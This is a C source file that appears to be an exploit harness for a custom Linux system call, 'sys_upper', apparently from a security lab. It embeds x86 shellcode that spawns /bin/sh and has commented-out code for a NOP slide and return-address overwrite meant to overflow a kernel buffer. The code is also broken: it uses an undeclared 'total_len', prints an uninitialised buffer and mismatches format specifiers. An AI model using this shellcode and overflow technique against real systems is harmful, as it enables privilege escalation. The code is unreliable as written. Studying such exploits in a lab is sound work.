#include <unistd.h>     // for syscall
#include <sys/syscall.h> // for syscall numbers
#include <stdio.h>
#include <string.h>      // for strlen
#include<stdlib.h>

#define NR_SYS_UPPER 223  // The syscall number for sys_upper

char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
          


int main(int argc, char **argv) {
    int i = 0xaaaaaaaa;
    printf("address of i is %p\n", &i);
    // int nop_slide = atoi(argv[1]) - 20;
    // int stack_address = strtoul(argv[2], NULL, 16);
    
    // int len_shellcode = len(shellcode)
    
    // int total_len = 20 + nop_slide + len_shellcode;
    // char input[total_len];  // Input buffer
    char input[12] = "aaaaaaaaa";  // Input buffer
    char output[4]; // Output buffer

    // for(int i = 0; i < nop_slide; i++)
    //     input[i] = '\x90';
    // for(int i=0;i<len_shellcode;i++)
    //     input[nop_slide + i] = shellcode[i];
    // for(int i=0;i<5;i++)
    //     *((unsigned long *)(input + nop_slide+len_shellcode+i*4)) = stack_address;  // Address of get_shell after NOPs

    input[total_len - 1 ] = '\0';
    
    // Print out before calling syscall
    printf("before: %s\n", input);
    // Call the modified syscall (syscall 223) with the crafted input
    syscall(NR_SYS_UPPER, input);

    // Print after syscall
    printf("after: %s\n", output);

    printf("variable is %p\n", i);
    return 0;
}
